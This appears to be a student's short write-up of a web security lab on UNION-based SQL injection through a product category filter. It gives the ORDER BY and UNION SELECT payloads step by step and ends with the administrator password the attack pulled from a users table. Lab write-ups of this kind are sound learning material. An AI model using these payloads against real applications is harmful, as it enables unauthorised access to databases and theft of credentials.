SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called users, with columns called username and password. 

First
Determine the number of columns using ORDER BY
' ORDER BY 1--
' ORDER BY 2--
-----
Second :
Determine the data types of the columns
' UNION select 'a',NULL,NULL--
----

'UNION select username, password from users--

administrator
99estao1pme6z6hfbvm4